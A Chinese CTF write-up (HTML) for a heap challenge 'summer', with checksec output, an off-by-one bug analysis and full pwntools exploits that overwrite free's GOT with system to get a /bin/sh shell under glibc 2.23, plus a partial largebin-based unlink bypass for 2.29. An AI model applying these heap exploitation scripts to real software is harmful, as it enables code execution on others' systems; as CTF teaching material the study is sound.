class="hljs-keyword">else</span><br>      &#123;<br>        <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;THE SONG DOESN&#x27;T EXIST!&quot;</span>);<br>      &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123; <span class="hljs-keyword">int</span> i = <span class="hljs-number">0</span>;<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  setvbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  <span class="hljs-keyword">char</span> buf[<span class="hljs-number">4</span>];<br>  <span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>)<br>  &#123;<br>    menu();<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;YOUR CHOISE :&quot;</span>);<br>    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">4</span>);<br>    <span class="hljs-comment">//scanf(&quot;%d&quot;,&amp;i);</span><br>    <span class="hljs-keyword">switch</span> (atoi(buf))<br>    &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>      download();<br>      sleep(<span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">2</span>:<br>      <span class="hljs-keyword">delete</span>();<br>      sleep(<span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">3</span>:<br>      listen();<br>      sleep(<span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">4</span>:<br>      edit();<br>      sleep(<span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">5</span>:<br>      <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>      sleep(<span class="hljs-number">1</span>);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-number">6</span>:<br>      <span class="hljs-keyword">for</span>(i;i&lt;<span class="hljs-number">20</span>;i++)<br>      &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;?????\n&quot;</span>);<br>        sleep(<span class="hljs-number">1</span>);<br>      &#125;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">default</span>:<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;INVALID CHOISE!!!&quot;</span>);<br>      <span class="hljs-keyword">break</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure>



<h2 id="3）解题分析"><a href="#3）解题分析" class="headerlink" title="3）解题分析"></a>3）解题分析</h2><h3 id="1）漏洞点分析"><a href="#1）漏洞点分析" class="headerlink" title="1）漏洞点分析"></a>1）漏洞点分析</h3><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">rin@fur1n:~/pwn$ checksec summer<br>[*] <span class="hljs-string">&#x27;/home/rin/pwn/summer&#x27;</span><br>    Arch:     amd64-64-little<br>    RELRO:    NO RELRO<br>    Stack:    Canary found<br>    NX:       NX enabled<br>    PIE:      NO PIE <br></code></pre></td></tr></table></figure>

<p>无pie，无relro</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;NAME :&quot;</span>);<br>      read(<span class="hljs-number">0</span>, **((<span class="hljs-keyword">void</span> ***)&amp;songlist + i), size + <span class="hljs-number">1</span>);<br>      <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;DOWNLOAD SUCCESFULLY&quot;</span>);<br></code></pre></td></tr></table></figure>

<p>一个很直观的漏洞点，read的时候会比原本规定的多读入一个字节，造成off by one。</p>
<h3 id="2）漏洞利用分析"><a href="#2）漏洞利用分析" class="headerlink" title="2）漏洞利用分析"></a>2）漏洞利用分析</h3><p>这种堆题一个比较经典的思路就是悬垂指针的利用。利用fake chunk来修改指针造成任意地址写。但众所周知，在2.26后的对于prev_size的检测为无脑chunk overlapping增加了难度。所以这里分别将程序以libc2.23和libc2.27，2.29执行，并且分别分析对应的漏洞利用。</p>
<h4 id="1-level0-baby-overlapping"><a href="#1-level0-baby-overlapping" class="headerlink" title="1)  level0-baby_overlapping"></a>1)  level0-baby_overlapping</h4><p>既然是单字节溢出，我们可以考虑修改chunk 的<code>prev_size</code>位后，控制这个chunk的指针，将它劫持到free或者show的got表地址然后leak libc基址。</p>
<p>核心利用思路与ctf wiki关于chunk overlapping上面的示例5一样。</p>
<p>申请两个chunk，然后编辑chunk0，利用off by one覆盖chunk1的<code>prev_size</code>位，然后释放chunk1，由于悬垂指针，我们可以重新add一个0x40大小的chunk1，用free的got表的地址覆盖指向chunk1的指针，再利用<code>show（1）</code>功能打印将它出来，这就完成了内存泄露。</p>
<p>然后利用free的真实地址进而计算出system的真实地址，继而在free的got的位置将free的got表值覆盖为system的地址，通过之前构造的chunk1的content中的<code>&quot;/bin/sh&quot;</code>进行系统调用并getshell。</p>
<p>exp如下。具体的细节说明在注释中。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;splitw&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>]<br>r = process([<span class="hljs-string">&quot;./glibc/lib00/lib/x86_64-linux-gnu/ld-2.23.so&quot;</span>, <span class="hljs-string">&quot;./summer_1&quot;</span>],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./glibc/lib00/lib/x86_64-linux-gnu/libc.so.6&quot;</span>&#125;)<span class="hljs-comment">#switch the verion of libc</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./glibc/lib00/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)<br>elf  = ELF(<span class="hljs-string">&#x27;./summer_1&#x27;</span>)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>  r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>  r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>  r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,content)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>  r.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>  r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>  r.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>  r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>  r.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>  r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>  r.sendafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(content))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span>():</span><br>  gdb.attach(r)<br>  pause()<br><br>free_got = <span class="hljs-number">0x4036E8</span> <br><br>add(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&quot;aaaa&quot;</span>)  <span class="hljs-comment"># chunk0</span><br>add(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&quot;bbbb&quot;</span>)  <span class="hljs-comment"># chunk1</span><br>edit(<span class="hljs-number">0</span>, <span class="hljs-string">b&quot;/bin/sh\x00&quot;</span> + <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">0x10</span> + <span class="hljs-string">b&quot;\x41&quot;</span>)<br><span class="hljs-comment">#construct thestruction of chunk0 for the application later.</span><br><span class="hljs-comment">#Especially the str(&#x27;/bin/sh&#x27;)to trigger the system execve()</span><br><span class="hljs-comment">#dbg()</span><br><br>delete(<span class="hljs-number">1</span>)<span class="hljs-comment">#free chunk1,then the 41 will become the size of chunk1</span><br>add(<span class="hljs-number">0x20</span>, p64(<span class="hljs-number">0</span>) * <span class="hljs-number">4</span> + p64(<span class="hljs-number">0x20</span>) + p64(elf.got[<span class="hljs-string">&#x27;free&#x27;</span>])) <br><span class="hljs-comment">#overlap the chunk1</span><br>show(<span class="hljs-number">1</span>) <br><br>free_addr = u64(r.recvuntil(<span class="hljs-string">&quot;DOWNLOAD SUCCESFULLY&quot;</span>)[:-<span class="hljs-number">5</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">&quot;\x00&quot;</span>))<br>libc_base = free_addr - libc.symbols[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><span class="hljs-comment">#leak</span><br><br>edit(<span class="hljs-number">1</span>, p64(system_addr))<br><br>show(<span class="hljs-number">1</span>)<br>delete(<span class="hljs-number">0</span>)<br><br>r.interactive()<br><br></code></pre></td></tr></table></figure>



<h4 id="2）level1-eazy-unlink"><a href="#2）level1-eazy-unlink" class="headerlink" title="2）level1-eazy_unlink"></a>2）level1-eazy_unlink</h4><p>虽然直接修改prevsize位造成堆叠非常简单，但是我们也可以利用unlink中的思路，在chunk中构造fakechunk，通过off by one/null 触发unlink造成堆叠。这并不是特地绕远路，在level2中我们无法直接单字节溢出，必须用到ulnink。</p>
<p>那为什么利用unlink能构造堆叠呢？<strong>详见extra。</strong></p>
<p>构造出堆叠以后的利用就相对模版化，因为保护同样还是只有nx和canary，我们可以很方便地同无保护的堆叠一样修改chunk的指针为<code>free</code>的got表地址来泄露程序的内存布局，然后再用system的got表值把<code>free</code>的got表值覆盖。</p>
<p>具体的细节分析如下。</p>
<h5 id="1）堆风水构造"><a href="#1）堆风水构造" class="headerlink" title="1）堆风水构造"></a>1）堆风水构造</h5><p><del>ps：程序会先分配一个0x20的chunk储存size。但是效果是一样的</del></p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#chunk0，用来写system的参数</span><br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#chunk1#在其中伪造fake chunk</span><br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;cccc&#x27;</span>)<span class="hljs-comment">#chunk2#触发unlink</span><br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;dddd&#x27;</span>)<span class="hljs-comment">#chunk3,用来防止free chunk 与 top chunk 合并</span><br></code></pre></td></tr></table></figure>

<p>连续申请4个chunk，大小都是0xf8。</p>
<p>0xf8这个数字的来源如何？</p>
<p>分配0xf8的content，实际在内存中是0x101。 为什么是0x101？ 首先我们要实现空字节溢出，一般来说是溢出一个<code>/x00</code>。如果chunk的size过小，先不说free以后分配的chunk的种类，单是空字节溢出也会使得size变成0，这里只有当原本的size是三位数的时候溢出才有意义。 其次还涉及到prec size的在内存的位置问题。</p>
<p><strong>详细分析参见exrta。</strong></p>
<h5 id="2）利用off-by-null-进行unlink"><a href="#2）利用off-by-null-进行unlink" class="headerlink" title="2）利用off by null 进行unlink"></a>2）利用off by null 进行unlink</h5><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">payload = p64(<span class="hljs-number">0x110</span>)<span class="hljs-comment">#prev_size</span><br>payload += p64(<span class="hljs-number">0xf1</span>)<span class="hljs-comment">#size</span><br>payload += p64(next_chunk_addr - <span class="hljs-number">0x18</span>)<span class="hljs-comment">#fd</span><br>payload += p64(next_chunk_addr - <span class="hljs-number">0x10</span>)<span class="hljs-comment">#bk</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xd0</span><span class="hljs-comment">#堆的大小减去伪造的heap头，0x100-0x8*5</span><br>payload += p64(<span class="hljs-number">0xf0</span>)<span class="hljs-comment">#next_prev_size，利用了off by null的单字节溢出</span><br>edit(<span class="hljs-number">1</span>,payload)<br>delete(<span class="hljs-number">2</span>)<span class="hljs-comment">#触发unlink、，造成堆叠</span><br></code></pre></td></tr></table></figure>

<p>这里开始进行unlink操作。</p>
<p>首先确定fd，bk地址。确定地址的思路事实上就是之前提到过的，extra部分中对于unlink利用的概述。</p>
<p>所以我们使用的是next_chunk_addr - 0x18/0x10。</p>
<p>Nextchunk addr的地址则是chunk2 ptr。可以通过调试得到具体的值即0x6024b0</p>
<p>并且我们通过空字节溢出使得next chunk的prev size位为F0，它将prev inuse改成了00，使得程序认为chunk1是一个free chunk，当我们释放chunk2，就会触发chunk1的unlink。</p>
<p>而且根据unlink的原理，这段exp使得这个fake chunk的地址向下减少了0x18.(ps:64bit下）</p>
<p>意味着chunk1已经和chunk2形成了堆叠。</p>
<p><strong>具体还是参见extra</strong></p>
<p>堆叠的形成意味着我们可以通过更改chunk1的内容改变它的指针。</p>
<figure class="highlight apache"><table><tr><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">payload1</span> = p<span class="hljs-number">64</span>(<span class="hljs-number">0</span>xf<span class="hljs-number">8</span>)#size<br><span class="hljs-attribute">payload1</span> = p<span class="hljs-number">64</span>(free_got_addr)#利用堆叠更改chunk<span class="hljs-number">1</span>的指针<br><span class="hljs-attribute">edit</span>(<span class="hljs-number">1</span>,payload<span class="hljs-number">1</span>）<br><span class="hljs-attribute">show</span>（<span class="hljs-number">1</span>）#此时打印出chunk<span class="hljs-number">1</span>的内容，即为free的真实地址<br></code></pre></td></tr></table></figure>

<h5 id="3）完整exp："><a href="#3）完整exp：" class="headerlink" title="3）完整exp："></a>3）完整exp：</h5><figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><br>context.terminal = [<span class="hljs-string">&quot;tmux&quot;</span>, <span class="hljs-string">&quot;splitw&quot;</span>, <span class="hljs-string">&quot;-h&quot;</span>]<br>r = process([<span class="hljs-string">&quot;./glibc/lib00/lib/x86_64-linux-gnu/ld-2.23.so&quot;</span>, <span class="hljs-string">&quot;./summer_1&quot;</span>],env=&#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span>:<span class="hljs-string">&quot;./glibc/lib00/lib/x86_64-linux-gnu/libc.so.6&quot;</span>&#125;)<span class="hljs-comment">#switch the verion of libc</span><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./glibc/lib00/lib/x86_64-linux-gnu/libc-2.23.so&#x27;</span>)<br>elf  = ELF(<span class="hljs-string">&#x27;./summer_1&#x27;</span>)<br><br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span>(<span class="hljs-params">size,content</span>):</span><br>  r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>  r.sendline(<span class="hljs-string">&quot;1&quot;</span>)<br>  r.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(size))<br>  r.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,content)<br><br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">delete</span>(<span class="hljs-params">idx</span>):</span><br>  r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>  r.sendline(<span class="hljs-string">&quot;2&quot;</span>)<br>  r.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span>(<span class="hljs-params">idx</span>):</span><br>  r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>  r.sendline(<span class="hljs-string">&quot;3&quot;</span>)<br>  r.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span>(<span class="hljs-params">idx,content</span>):</span><br>  r.recvuntil(<span class="hljs-string">&quot;:&quot;</span>)<br>  r.sendline(<span class="hljs-string">&quot;4&quot;</span>)<br>  r.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(idx))<br>  r.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>,<span class="hljs-built_in">str</span>(content))<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">dbg</span>():</span><br>  gdb.attach(r)<br>  pause()<br><br>unlink_addr = <span class="hljs-number">0x6024b0</span><br>free_got_addr = <span class="hljs-number">0x4036E8</span><br>next_chunk_addr = unlink_addr<br><br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;aaaa&#x27;</span>)<span class="hljs-comment">#chunk0，用来写system的参数</span><br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;bbbb&#x27;</span>)<span class="hljs-comment">#chunk1#在其中伪造fake chunk</span><br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;cccc&#x27;</span>)<span class="hljs-comment">#chunk2#触发unlink</span><br>add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">b&#x27;dddd&#x27;</span>)<span class="hljs-comment">#chunk3,用来防止free chunk 与 top chunk 合并</span><br><br><br>payload = p64(<span class="hljs-number">0x100</span>)<span class="hljs-comment">#prev_size</span><br>payload += p64(<span class="hljs-number">0xf1</span>)<span class="hljs-comment">#size</span><br>payload += p64(next_chunk_addr - <span class="hljs-number">0x18</span>)<span class="hljs-comment">#fd</span><br>payload += p64(next_chunk_addr - <span class="hljs-number">0x10</span>)<span class="hljs-comment">#bk</span><br>payload += <span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xd0</span><span class="hljs-comment">#堆的大小减去伪造的heap头，0x110-0x8*5</span><br>payload += <span class="hljs-string">b&#x27;0xf0&#x27;</span><span class="hljs-comment">#next_prev_size</span><br>edit(<span class="hljs-number">1</span>,payload)<br>delete(<span class="hljs-number">2</span>)<span class="hljs-comment">#触发unlink，造成堆叠</span><br><br>payload1 = p64(<span class="hljs-number">0xf8</span>)<span class="hljs-comment">#size</span><br>payload1 += p64(free_got_addr)<span class="hljs-comment">#利用堆叠更改chunk1的指针为free的got表</span><br>edit(<span class="hljs-number">1</span>,payload1)<br>show(<span class="hljs-number">1</span>)<span class="hljs-comment">#此时打印出chunk1的内容，即为free的真实地址</span><br><br><span class="hljs-comment">#leak</span><br>free_addr = u64(r.recvuntil(<span class="hljs-string">&quot;DOWNLOAD SUCCESFULLY&quot;</span>)[:-<span class="hljs-number">5</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&quot;\x00&quot;</span>))<br>libc_base = free_addr - libc.symbols[<span class="hljs-string">&#x27;free&#x27;</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(libc_base))<br>system_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br><br>edit(<span class="hljs-number">1</span>,p64(system_addr))<span class="hljs-comment">#更改free的got表值为system函数的真实地址</span><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;/bin/sh\x00&quot;</span>)<span class="hljs-comment">#将chunk0的内容填充为binsh，作为下面执行函数的参数</span><br>delete(<span class="hljs-number">0</span>)<span class="hljs-comment">#由于free的got表值已经被篡改为system，所以调用free即调用system。</span><br><br>r.interactive()<br></code></pre></td></tr></table></figure>





<h4 id="3）level2-harder-unlink"><a href="#3）level2-harder-unlink" class="headerlink" title="3）level2-harder_unlink"></a>3）level2-harder_unlink</h4><p>2.29以后glibc代码中增加了对于prev_size的检测</p>
<figure class="highlight c"><table><tr><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* consolidate backward */</span><br><span class="hljs-keyword">if</span> (!prev_inuse(p)) &#123;<br>    prevsize = prev_size (p);<br>    size += prevsize;<br>    p = chunk_at_offset(p, -((<span class="hljs-keyword">long</span>) prevsize));<br>    <span class="hljs-keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))<br>        malloc_printerr (<span class="hljs-string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);<br>    unlink_chunk (av, p);<br>&#125;<br></code></pre></td></tr></table></figure>

<p>来对抗单字节溢出。</p>
<p>检测的内容也很好理解，如果当chunk的<code>size</code>位如果与next chunk的<code>prev_size</code>位不相等即报错。这个检测使我们很难直接通过单字节溢出来控制prev size位。</p>
<p>那么我们应该如何绕过它呢？</p>
<p>很自然地我们想到可以更改next chunk的<code>prev_size</code>，但是仔细想想就会发现这是个无尽套娃。基本不可能。</p>
<p>既然想不出简单的办法绕过，那我们就干脆不修改<code>prev_size</code>了。</p>
<p>一般的poison null byte是通过伪造fd和bk位来伪造fake chunk的地址，使得地址向低地址移动，既然现在不好控制，那么如果内存上有现成的fd和bk供我们利用呢？我们是不是可以利用它们来控制fake chunk—-确有其事，比如说largebin chunk的<code>fd_nextsize</code>,<code>bk_nextsize</code>。</p>
<p>我们可以以<code>fd_nextsize</code>作为fake chunk的fd，<code>bk_nextsize</code>作为fake chunk的bk。</p>
<p>由于<code>fd_nextsize</code>和<code>bk_nextsize</code>用于指向第一个与自己大小不同的chunk，当largebin中只有一个chunk，这两个指针都是指向chunk本身。</p>
<p><strong>具体见extra部分中对于largebin的概述。</strong></p>
<p>利用方式则是：</p>
<ol>
<li><p>申请两个较大的chunk后再释放，要求chunk进入unsorted bin。</p>
</li>
<li><p>将一个largebin申请回来。</p>
</li>
<li><p>在这个largebin chunkA内构造fake。在原本chunkA的bk位置写fake chunk的size位，也就是将fake chunk构建在chunk+0x10处。</p>
</li>
<li><p>然后处理fake chunk的fd和bk位。目的是以chunkA的<code>fd_nextsize</code>指针作为fake chunk的fd位，<code>bk_nextsize</code>指针作为fake chunk的bk。首先是fake chunk的fd位，把chunkA的<code>fd_nextsize</code>指针覆盖到一个可以控制的其bk位的 chunkB上，再伪造chunkB的bk位使其指向fake chunk即可。</p>
</li>
<li><p>对于fake chunk的bk位，按照检测，要触发unlink，bk必须指向fake chunk本身，也就是chunkA+0x10处，这里我们可以利用fastbin的特性，将一个fastbin chunk作为跳板绕过。</p>
</li>
<li><p>fake chunk构造完成后直接free chunkA，触发unlink，造成堆叠。可以利用它leak，然后改free got表。</p>
</li>
</ol>
<p>我们通过exp和图示来理清楚。</p>
<p>由于并没有开启地址随机化，所以地址的覆盖并不需要部分覆写。</p>
<p>前三步可以用下面的图表来说明：</p>
<p><img src="https://img-blog.csdnimg.cn/20210715135602230.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>首先将tcache填满。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;fill&#x27;</span>)<br>    delete(a)<br><br><span class="hljs-keyword">for</span> b <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>	add(<span class="hljs-number">0x1020</span>,<span class="hljs-string">b&#x27;fill&#x27;</span>)<br>	delete(b)<br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>	add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;fill&#x27;</span>)<br>	delete(c)<br></code></pre></td></tr></table></figure>

<p>然后让chunk21成为largebin chunk</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x500</span>,<span class="hljs-string">b&#x27;largebin chnuk0&#x27;</span>)<span class="hljs-comment">#chunk21</span><br>add(<span class="hljs-number">0x20</span>,<span class="hljs-string">b&#x27;top&#x27;</span>)<span class="hljs-comment">#chunk22</span><br>delete(<span class="hljs-number">21</span>)<br>add(<span class="hljs-number">0x1000</span>,<span class="hljs-string">b&#x27;functional gadgets&#x27;</span>)<span class="hljs-comment">#chunk23,to push the chunk21 to largebin</span><br><span class="hljs-comment">#有关这一步的具体说明可以看Tcache部分。</span><br></code></pre></td></tr></table></figure>

<p>至此我们获得了一个0x500大小的largebin chunkA，此时这个chunkA的状态还是free。</p>
<p>然后我们要在chunkA的header开始伪造fake chunk。</p>
<p>这是比较关键的一部分。利用到了large bin遗留在内存上的<code>fd_nextsize</code> 和 <code>bk_nextsize</code> 指针。以 <code>fd_nextsize</code> 为 fake_chunk 的 fd，<code>bk_nextsize</code> 为 fake_chunk 的 bk。但是我们首先需要绕过unlink的安全检测，即之前说过的<code>Fd-&gt;bk = p, BK-&gt;fd = p</code></p>
<p>ps：我们伪造的fake chunk是smallbin chunk，在bin中也是由双向链表维护。</p>
<p>我们分别为<code>FD-&gt;bk = p</code>和<code>BK-&gt;fd = p</code>进行绕过</p>
<p>首先是<code>FD-&gt;bk = p</code>的绕过。</p>
<p>回忆一下之前level1我们绕过的方法论，也就是：</p>
<figure class="highlight nix"><table><tr><td class="code"><pre><code class="hljs nix">FD-&gt;<span class="hljs-attr">bk</span> = <span class="hljs-attr">p</span>   ==&gt; <span class="hljs-attr">bk_nextsize</span> = p<br></code></pre></td></tr></table></figure>

<p>所以我们的目的是让<code>bk_nextsize</code>指向fake chunk。</p>
<p><code>BK-&gt;fd = p</code>的绕过同理，等价于构造<code>fd_nextsize</code>，使它指向fake chunk。</p>
<p>但是有趣的是此时我们的largebin中只有一个largebin chunk，它的<code>fd_nextsize</code>,<code>bk_nextsize</code>本身就是指向chunk本身的。然而这样没有任何意义，我们需要修改<code>fd_nextsize</code>到我们需要的地方。</p>
<p>这便又是问题所在。我们需要找到一个方法使得修改<code>fd_nextsize</code>的同时又能绕过检测。</p>
<p>这里我们需要用到其他类型bin chunk的辅助。</p>
<p>我们可以很容易地控制<code>fd_nextsize</code>指向某个smallbin chunkC，而这个smallbin chunkC的fd也指向堆上的某个地址。我们又可以通过修改这个chunkC的fd指针使得它指向fake chunk。这样一来我们利用 chunkC充当中间角色，绕了一圈使得我们目的达成的同时也没有被检测绊住。</p>
<p><img src="https://img-blog.csdnimg.cn/20210715135622971.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUxMTg3NTU4,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p>然后来看实际操作。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x28</span>,p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x530</span>) + p64(chunkC_addr))<span class="hljs-comment">#fake chunk </span><br></code></pre></td></tr></table></figure>

<p>先申请一个chunkB，用来构造fake chunk的size和fd指针。这里fake chunk fd还只是指向chunkC，我们需要修改chunkC的fd指针使它指向fake chunk。</p>
<p>修改chunk header需要利用到悬垂指针。我们下一步应该是构造出chunkC的悬垂指针。</p>
<p>比如从 small bin中拿出的chunk，如果其bin中有多个chunk的话，那么拿出来的chunk的bk上必定残留了指针，因此可以进行覆盖。</p>
<p>这里稍微有一些能讲的基础知识。还是参见extra吧。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">add(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#24</span><br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#25</span><br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#26</span><br>add(<span class="hljs-number">0x28</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#27</span><br>add(<span class="hljs-number">0x600</span>,<span class="hljs-string">b&#x27;a&#x27;</span>) <span class="hljs-comment">#28,off by null</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    add(<span class="hljs-number">0x28</span>,<span class="hljs-string">&#x27;tcache&#x27;</span>)<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">7</span>):<br>    delete(<span class="hljs-number">23</span> + i)<span class="hljs-comment">#填充tcache</span><br></code></pre></td></tr></table></figure>

<p>多申请一些chunk。</p>
